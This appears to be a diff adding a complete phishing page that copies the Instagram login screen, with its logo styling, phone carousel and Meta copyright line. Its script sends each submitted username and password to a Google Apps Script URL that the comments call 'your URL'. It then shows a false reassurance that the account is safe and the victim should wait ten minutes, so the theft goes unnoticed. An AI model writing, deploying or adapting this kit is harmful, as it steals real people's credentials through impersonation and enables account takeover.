@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Instagram Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      background-color: #fafafa;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+    }
+    .instagram-logo {
+      font-family: "Billabong", cursive, "Segoe Script", cursive, Arial, sans-serif;
+      font-size: 3.5rem;
+      line-height: 1;
+      letter-spacing: 2px;
+      color: #262626;
+      user-select: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    input:focus {
+      outline: none;
+      border-color: #a8a8a8;
+      box-shadow: 0 0 0 1px #a8a8a8;
+      background-color: #fff;
+    }
+    input[type="number"]::-webkit-inner-spin-button,
+    input[type="number"]::-webkit-outer-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+    ::-webkit-scrollbar {
+      width: 6px;
+    }
+    ::-webkit-scrollbar-thumb {
+      background-color: #ed4956;
+      border-radius: 3px;
+    }
+    .show-password-btn {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 0.875rem;
+      font-weight: 600;
+      color: #0095f6;
+      cursor: pointer;
+      user-select: none;
+      background: transparent;
+      border: none;
+      padding: 0;
+      line-height: 1;
+    }
+    .input-wrapper {
+      position: relative;
+      width: 100%;
+    }
+    #promptBox {
+      background: #eafaf1;
+      border: 1px solid #34a853;
+      color: #196127;
+      font-size: 15px;
+      line-height: 1.6;
+      padding: 24px 28px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      text-align: center;
+      user-select: none;
+      max-width: 100%;
+      box-sizing: border-box;
+      white-space: pre-line;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
+  <!-- Page 1: Login Form -->
+  <div id="page1" class="min-h-screen flex flex-col items-center justify-center px-4">
+    <div class="flex flex-col md:flex-row items-center justify-center gap-12 max-w-5xl w-full">
+      <div class="hidden md:block relative w-[380px] h-[634px]">
+        <img alt="Black Instagram phone mockup frame with screen" class="absolute top-0 left-0 w-full h-full object-contain z-20" draggable="false" height="634" src="https://instagram.com/image/6e844fc5-9ef0-4ad3-3f52-be79d5bb12a6.jpg" width="380" />
+        <div class="absolute top-[70px] left-[54px] w-[272px] h-[484px] overflow-hidden rounded-[40px] z-10" id="carousel">
+          <img alt="Instagram carousel image showing a colorful photo of a person holding a camera in a sunny park" class="w-full h-full object-cover carousel-image active" draggable="false" height="484" src="https://instagram.com/image/f5b3bcbe-1be5-4e90-0d5c-40f6d20214d7.jpg" width="272" />
+          <img alt="Instagram carousel image showing a close-up of a delicious food plate with vibrant colors" class="w-full h-full object-cover carousel-image hidden" draggable="false" height="484" src="https://instagram.com/image/b6241804-b801-4c00-9786-d1d0f845c507.jpg" width="272" />
+          <img alt="Instagram carousel image showing a scenic beach sunset with palm trees and calm waves" class="w-full h-full object-cover carousel-image hidden" draggable="false" height="484" src="https://instagram.com/image/839fdddd-0496-4458-547a-ff90f858227f.jpg" width="272" />
+        </div>
+      </div>
+      <div class="flex flex-col items-center w-full max-w-sm">
+        <div class="bg-white border border-gray-300 rounded-md w-full px-10 pt-10 pb-8 flex flex-col items-center">
+          <h1 aria-label="Instagram" class="instagram-logo mb-8">Instagram</h1>
+          <form name="instagramLoginForm" class="w-full flex flex-col space-y-2" id="loginForm" novalidate>
+            <input aria-describedby="usernameError" aria-invalid="false" autocomplete="username" class="w-full px-3 py-2 border border-gray-300 rounded bg-gray-50 text-sm text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-gray-400 focus:border-gray-400" id="username" name="username" placeholder="Phone number, username, or email" type="text" />
+            <div class="input-wrapper">
+              <input aria-describedby="passwordError" aria-invalid="false" autocomplete="current-password" class="w-full px-3 py-2 border border-gray-300 rounded bg-gray-50 text-sm text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-gray-400 focus:border-gray-400 pr-16" id="password" name="password" placeholder="Password" type="password" />
+              <button type="button" class="show-password-btn" id="togglePassword" aria-label="Show password" tabindex="-1">Show</button>
+            </div>
+            <button class="w-full mt-2 py-2 rounded text-white font-semibold text-sm bg-blue-500 transition-colors disabled:bg-blue-300" disabled id="loginBtn" type="submit">Log In</button>
+          </form>
+          <div aria-live="assertive" class="mt-3 text-xs text-red-600 font-semibold text-center min-h-[1.25rem]" id="errorMsg" role="alert"></div>
+          <div class="flex items-center w-full my-6">
+            <div class="flex-grow border-t border-gray-300"></div>
+            <p class="mx-4 text-gray-400 font-semibold text-sm select-none">OR</p>
+            <div class="flex-grow border-t border-gray-300"></div>
+          </div>
+          <button class="flex items-center justify-center space-x-2 text-blue-600 font-semibold text-sm select-none" type="button">
+            <i class="fab fa-facebook-square fa-lg"></i>
+            <span>Log in with Facebook</span>
+          </button>
+          <a class="mt-6 text-xs text-blue-600 font-semibold text-center w-full block select-none" href="#">Forgot password?</a>
+        </div>
+        <div class="bg-white border border-gray-300 rounded-md mt-6 py-4 w-full text-center text-sm select-none">
+          Don't have an account? <a class="text-blue-500 font-semibold ml-1" href="#">Sign up</a>
+        </div>
+        <p class="mt-10 text-xs text-gray-400 select-none">© 2024 Instagram from Meta</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Page 2: Prompt page -->
+  <div id="page2" class="min-h-screen flex flex-col items-center justify-center px-6 hidden">
+    <div class="flex flex-col md:flex-row items-center justify-center gap-12 max-w-4xl w-full">
+      <div class="hidden md:block relative w-[380px] h-[634px]">
+        <img alt="Black Instagram phone mockup frame with screen" class="absolute top-0 left-0 w-full h-full object-contain z-20" draggable="false" height="634" src="https://instagram.com/image/6e844fc5-9ef0-4ad3-3f52-be79d5bb12a6.jpg" width="380" />
+        <div class="absolute top-[70px] left-[54px] w-[272px] h-[484px] overflow-hidden rounded-[40px] z-10" id="carousel2">
+          <img alt="Instagram carousel image showing a colorful photo of a person holding a camera in a sunny park" class="w-full h-full object-cover carousel-image2 active" draggable="false" height="484" src="https://instagram.com/image/f5b3bcbe-1be5-4e90-0d5c-40f6d20214d7.jpg" width="272" />
+          <img alt="Instagram carousel image showing a close-up of a delicious food plate with vibrant colors" class="w-full h-full object-cover carousel-image2 hidden" draggable="false" height="484" src="https://instagram.com/image/b6241804-b801-4c00-9786-d1d0f845c507.jpg" width="272" />
+          <img alt="Instagram carousel image showing a scenic beach sunset with palm trees and calm waves" class="w-full h-full object-cover carousel-image2 hidden" draggable="false" height="484" src="https://instagram.com/image/839fdddd-0496-4458-547a-ff90f858227f.jpg" width="272" />
+        </div>
+      </div>
+      <div class="flex flex-col items-center w-full max-w-md bg-white border border-gray-300 rounded-md p-8">
+        <h1 aria-label="Instagram" class="instagram-logo mb-8 select-none">Instagram</h1>
+        <div id="promptBox" class="text-gray-800">
+          Your account is safe and secure.<br /><br />
+          Please wait for 10 minutes before attempting to log in again.<br /><br />
+          This is a security measure to protect your account from unauthorized access.<br /><br />
+          If you did not attempt to log in, please reset your password immediately.<br /><br />
+          Thank you for trusting Instagram to keep your account protected.
+        </div>
+        <button id="backBtn" class="mt-6 w-full py-2 bg-blue-500 text-white font-semibold rounded text-sm hover:bg-blue-600 transition-colors" type="button">Back to Login</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Carousel logic
+    function runCarousel(images, interval) {
+      let currentIndex = 0;
+      setInterval(() => {
+        images[currentIndex].classList.add("hidden");
+        images[currentIndex].classList.remove("active");
+        currentIndex = (currentIndex + 1) % images.length;
+        images[currentIndex].classList.remove("hidden");
+        images[currentIndex].classList.add("active");
+      }, interval);
+    }
+    runCarousel(document.querySelectorAll(".carousel-image"), 3500);
+    runCarousel(document.querySelectorAll(".carousel-image2"), 3500);
+
+    // Page elements
+    const page1 = document.getElementById("page1");
+    const page2 = document.getElementById("page2");
+    const loginForm = document.getElementById("loginForm");
+    const loginBtn = document.getElementById("loginBtn");
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
+    const errorMsg = document.getElementById("errorMsg");
+    const togglePasswordBtn = document.getElementById("togglePassword");
+    const backBtn = document.getElementById("backBtn");
+
+    // Enable login button only if both fields have input
+    function toggleButton() {
+      if (usernameInput.value.trim() && passwordInput.value.trim()) {
+        loginBtn.disabled = false;
+      } else {
+        loginBtn.disabled = true;
+        errorMsg.textContent = "";
+        usernameInput.setAttribute("aria-invalid", "false");
+        passwordInput.setAttribute("aria-invalid", "false");
+      }
+    }
+
+    usernameInput.addEventListener("input", toggleButton);
+    passwordInput.addEventListener("input", toggleButton);
+
+    // Toggle password visibility
+    togglePasswordBtn.addEventListener("click", () => {
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        togglePasswordBtn.textContent = "Hide";
+        togglePasswordBtn.setAttribute("aria-label", "Hide password");
+      } else {
+        passwordInput.type = "password";
+        togglePasswordBtn.textContent = "Show";
+        togglePasswordBtn.setAttribute("aria-label", "Show password");
+      }
+      passwordInput.focus();
+      passwordInput.setSelectionRange(passwordInput.value.length, passwordInput.value.length);
+    });
+
+    // On login form submit, send data to Google Sheets
+    loginForm.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      // Validation
+      if (!username) {
+        errorMsg.textContent = "Username incorrect!";
+        usernameInput.setAttribute("aria-invalid", "true");
+        usernameInput.focus();
+        return;
+      }
+      if (!password) {
+        errorMsg.textContent = "Password incorrect!";
+        passwordInput.setAttribute("aria-invalid", "true");
+        passwordInput.focus();
+        return;
+      }
+
+      // Button disable aur loading dikhao
+      loginBtn.disabled = true;
+      loginBtn.textContent = "Logging In...";
+
+      // Google Apps Script URL
+      const scriptUrl = "https://script.google.com/macros/s/AKfycby8lhPdevDHNRTjq9IXpnz-Gz89OIrkCJoISRInW7wtdS9YtXOheXzIKiwfJR7B3Ad3/exec"; // Tumhara URL
+
+      // Data bhejo
+      fetch(scriptUrl, {
+        method: 'POST',
+        body: JSON.stringify({ username, password }),
+        headers: { "Content-Type": "application/json" },
+        mode: "no-cors" // Netlify ke liye CORS issue fix
+      })
+      .then(response => response.text())
+      .then(data => {
+        loginBtn.disabled = false;
+        loginBtn.textContent = "Log In";
+        // Since no-cors mode doesn't allow reading response, we assume success if no error
+        page1.classList.add("hidden");
+        page2.classList.remove("hidden");
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        loginBtn.disabled = false;
+        loginBtn.textContent = "Log In";
+        errorMsg.textContent = "Server se connect nahi ho raha, try again!";
+      });
+    });
+
+    // Back button to return to login page
+    backBtn.addEventListener("click", () => {
+      page2.classList.add("hidden");
+      page1.classList.remove("hidden");
+      usernameInput.value = "";
+      passwordInput.value = "";
+      errorMsg.textContent = "";
+      toggleButton();
+      passwordInput.type = "password";
+      togglePasswordBtn.textContent = "Show";
+      togglePasswordBtn.setAttribute("aria-label", "Show password");
+      usernameInput.focus();
+    });
+  </script>
+</body>
+</html>
